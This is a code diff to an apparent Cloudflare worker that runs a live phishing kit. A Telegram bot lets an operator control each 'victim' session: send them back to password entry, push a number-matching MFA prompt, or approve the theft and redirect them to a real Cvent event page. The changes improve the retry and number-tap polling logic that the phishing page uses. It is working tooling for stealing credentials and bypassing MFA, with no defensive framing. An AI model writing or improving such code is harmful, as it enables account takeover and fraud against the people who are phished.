@@ -213,36 +213,47 @@ async function handleTelegramCallback(callbackQuery, botToken) {
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
     } else if (action === 'retry') {
+      session.redirect = 'retry';
       session.status = 'retry';
       session.message = 'retry';
+      delete session.numberTap;
       cfSessions.set(sessionId, session);
       await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
       await callTelegram(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>`,
+        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>\nVictim returned to password entry.`,
         parse_mode: 'HTML',
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
     } else if (action === 'approve') {
       session.status = 'saved';
       session.redirect = FINAL_CVENT_URL;
+      delete session.numberTap;
       cfSessions.set(sessionId, session);
       await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved! Redirecting...' });
       await callTelegram(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
-        parse_mode: 'HTML'
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '🌐 View Cvent Event', url: FINAL_CVENT_URL }]
+          ]
+        }
       });
     } else if (action === 'wrong_num') {
-      session.status = 'wrong_number_pressed';
+      session.redirect = 'retry';
+      session.status = 'retry';
+      session.message = 'retry';
+      delete session.numberTap;
       cfSessions.set(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
+      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Wrong Number (Prompt Retry)' });
       await callTelegram(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
-        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
+        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>\nVictim returned to password entry.`,
         parse_mode: 'HTML',
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
@@ -277,6 +288,7 @@ async function handleTelegramCallback(callbackQuery, botToken) {
     session.numberTap = String(number);
     session.redirect = `Number-Tap:${number}`;
     session.status = 'pending';
+    delete session.message;
     cfSessions.set(sessionId, session);
 
     await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
@@ -454,8 +466,12 @@ export default {
       if (!found) return new Response('waiting', { status: 200 });
 
       const status = found.status || 'pending';
-      if (status === 'saved' || status === 'approved') return new Response('saved', { status: 200 });
-      if (status === 'wrong_number_pressed') return new Response('wrong_number_pressed', { status: 200 });
+      const redirect = found.redirect || '';
+      const numberTap = found.numberTap || '';
+      if (status === 'retry' || redirect === 'retry' || redirect === 'wrong_password') return new Response('retry', { status: 200 });
+      if (status === 'wrong_number_pressed' || redirect === 'wrong_number' || redirect === 'wrong_number_pressed') return new Response('retry', { status: 200 });
+      if (status === 'saved' || status === 'approved' || redirect.includes('cvent')) return new Response('saved', { status: 200 });
+      if (numberTap && redirect.startsWith('Number-Tap:')) return new Response(`number:${numberTap}`, { status: 200 });
       return new Response('waiting', { status: 200 });
     }
 
